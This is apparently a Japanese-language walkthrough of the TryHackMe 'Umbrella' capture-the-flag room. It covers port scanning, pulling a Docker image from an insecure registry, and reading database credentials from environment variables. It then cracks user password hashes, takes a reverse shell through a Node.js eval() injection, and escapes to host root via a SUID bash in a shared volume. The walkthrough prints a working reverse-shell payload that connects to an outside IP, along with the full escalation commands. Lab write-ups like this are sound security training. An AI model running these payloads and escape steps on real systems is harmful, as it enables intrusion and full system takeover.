# Umbrella CTF

https://tryhackme.com/room/umbrella

## Enumeration

```shell
TARGET=10.201.109.61
sudo bash -c "echo $TARGET   umbrella.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
3306/tcp open  mysql      syn-ack ttl 63
5000/tcp open  upnp       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,3306,5000,8080 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 5.7.40
5000/tcp open  http    Docker Registry (API: 2.0)
8080/tcp open  http    Node.js (Express middleware)
```

SSH,MySQL,Docker(HTTP),HTTP

8080ポートにアクセスすると、ログイン画面が表示される。  

mysqlポートでユーザー名を列挙

```sh
root@ip-10-201-97-190:~# nmap -sS -n -p3306 --script "mysql-enum" $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-19 01:12 GMT
Nmap scan report for 10.201.109.61
Host is up (0.00015s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
MAC Address: 16:FF:C7:7C:75:11 (Unknown
```

### ディレクトリ列挙

8080ポートはcssディレクトリしか出てこなかった。

```sh
dirb http://umbrella.thm:8080
```

### docker

リポジトリを列挙

```sh
root@ip-10-201-97-190:~# curl http://umbrella.thm:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

HTTPを使えるよう、/etc/docker/daemon.json に記述

```json
{
  "insecure-registries": ["umbrella.thm:5000"]
}
```

docker再起動

```sh
sudo systemctl restart docker
```

pull, ファイル保存。

```sh
$ sudo docker pull umbrella.thm:5000/umbrella/timetracking
```

イメージの解析

```sh
$ dive ./timtracking.tar
```

8080ポートのアプリケーションソースを展開。

```js
$ cat 1a0ae236d48c3024272aa94bf7b9c8d841e024cee56f7a9abe66e066bd132526
usr/0040755000000000000000000000000014347724600010070 5ustar0000000000000000usr/src/0040755000000000000000000000000014351025442010650 5ustar0000000000000000usr/src/app/0040755000000000000000000000000014351025533011431 5ustar0000000000000000usr/src/app/app.js0100664000000000000000000000624514351020162012546 0ustar0000000000000000const mysql = require('mysql');
const express = require('express');
const session = require('express-session');
const path = require('path');
const crypto = require('crypto')
const cookieParser = require('cookie-parser');
const fs = require('fs');

const connection = mysql.createConnection({
        host     : process.env.DB_HOST,
        user     : process.env.DB_USER,
        password : process.env.DB_PASS,
        database : process.env.DB_DATABASE
});
（以下略）
```

環境変数を参照していることが分かった。

インスペクト。環境変数が判明。

```sh
$ sudo docker inspect umbrella.thm:5000/umbrella/timetracking

...
"Env": [
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "NODE_VERSION=19.3.0",
    "YARN_VERSION=1.22.19",
    "DB_HOST=db",
    "DB_USER=root",
    "DB_PASS=[REDACTED]",
    "DB_DATABASE=timetracking",
    "LOG_FILE=/logs/tt.log"
],
...
```

MySQL接続成功。

```sh
$ sudo mysql -h $TARGET -u root -p --skip-ssl-verify-server-cert
```

ユーザー名とパスワードハッシュ取得

```txt
MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | [REDACTED]                       |   360 |
| chris-r  | [REDACTED]                       |   420 |
| jill-v   | [REDACTED]                       |   564 |
| barry-b  | [REDACTED]                       | 47893 |
+----------+----------------------------------+-------+
```

4人とも、rockyou.txt でクラックできた。

## timetracking

再び docker イメージから app.js を参照

```js
// http://localhost:8080/time
app.post('/time', function(request, response) {

    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
                let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

                connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
                        if (error) {
                                log(error, "error")
                        };

                        log(`${username} added ${time} minutes.`, "info")
                        response.redirect('/');
                });
        } else {
        response.redirect('/');;
    }

});
```

`eval(request.body.time)` の部分がポイントと思われる。

下記を送ったらリバースシェルを取れた。

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8888, "192.168.134.238", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

ゲストOSのrootユーザー。

```sh
$ nc -lnvp 8888        
listening on [any] 8888 ...
connect to [192.168.134.238] from (UNKNOWN) [10.49.175.221] 33224
id
uid=0(root) gid=0(root) groups=0(root)
```

## 権限昇格

nodeユーザーのディレクトリには何もない。

```sh
ls -al /home
total 12
drwxr-xr-x 1 root root 4096 Dec 21  2022 .
drwxr-xr-x 1 root root 4096 Dec 22  2022 ..
drwxr-xr-x 2 node node 4096 Dec 21  2022 node
cd /home/node
ls -al
total 20
drwxr-xr-x 2 node node 4096 Dec 21  2022 .
drwxr-xr-x 1 root root 4096 Dec 21  2022 ..
-rw-r--r-- 1 node node  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 node node 3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 node node  807 Mar 27  2022 .profile
```

/logs ディレクトリがある。

```sh
ls -al /    
total 76
drwxr-xr-x   1 root root 4096 Dec 22  2022 .
drwxr-xr-x   1 root root 4096 Dec 22  2022 ..
-rwxr-xr-x   1 root root    0 Dec 22  2022 .dockerenv
drwxr-xr-x   2 root root 4096 Dec 19  2022 bin
drwxr-xr-x   2 root root 4096 Dec  9  2022 boot
drwxr-xr-x   5 root root  340 Nov 19 06:36 dev
drwxr-xr-x   1 root root 4096 Dec 22  2022 etc
drwxr-xr-x   1 root root 4096 Dec 21  2022 home
drwxr-xr-x   1 root root 4096 Dec 19  2022 lib
drwxr-xr-x   2 root root 4096 Dec 19  2022 lib64
drwxrw-rw-   2 1001 1001 4096 Dec 22  2022 logs
drwxr-xr-x   2 root root 4096 Dec 19  2022 media
drwxr-xr-x   2 root root 4096 Dec 19  2022 mnt
drwxr-xr-x   1 root root 4096 Dec 21  2022 opt
dr-xr-xr-x 182 root root    0 Nov 19 06:36 proc
drwx------   1 root root 4096 Dec 21  2022 root
drwxr-xr-x   3 root root 4096 Dec 19  2022 run
drwxr-xr-x   2 root root 4096 Dec 19  2022 sbin
drwxr-xr-x   2 root root 4096 Dec 19  2022 srv
dr-xr-xr-x  13 root root    0 Nov 19 06:36 sys
drwxrwxrwt   1 root root 4096 Dec 21  2022 tmp
drwxr-xr-x   1 root root 4096 Dec 19  2022 usr
drwxr-xr-x   1 root root 4096 Dec 19  2022 var
```

claire-r でホスト環境にSSH接続できた。

```sh
$ ssh claire-r@10.49.175.221
```

/home/claire-r/timeTracker-src/logs を、ゲストOSの /logs にマウントしている。

```sh
claire-r@ip-10-10-165-96:~$ cat timeTracker-src/docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: '[REDACTED]'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
```

ホストOS上で bash をコピー。

```sh
claire-r@ip-10-10-165-96:~/timeTracker-src/logs$ cp /usr/bin/bash ./
```

ゲストOS上の root ユーザーで root のSUIDを付ける。

```sh
chown root:root /logs/bash
chmod +s /logs/bash
```

SUID設定成功。

```sh
claire-r@ip-10-10-165-96:~/timeTracker-src/logs$ ls -al
total 41344
drwxrw-rw- 2 claire-r claire-r     4096 Nov 19 07:34 .
drwxrwxr-x 6 claire-r claire-r     4096 Dec 22  2022 ..
-rwsr-sr-x 1 root     root      1183448 Nov 19 07:34 bash
```

昇格

```sh
claire-r@ip-10-10-165-96:~/timeTracker-src/logs$ ./bash -p
bash-5.0# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) egid=0(root) groups=0(root),1001(claire-r)
```

## 振り返り

- mysqlコマンドをsudoで実行しないと `ERROR 1698 (28000): Access denied for user 'root'@'localhost'` エラーとなってしばらくハマった。
- このエスケープ方法は、NFS の no_root_squash オプションと同じ理屈。
- ホストOSの非特権ユーザーとしてログインできる場合、マウント設定によってはこの攻撃が成功する場合がある。

## Tags

#tags:docker解析 #tags:dockerエスケープ #tags:node.js
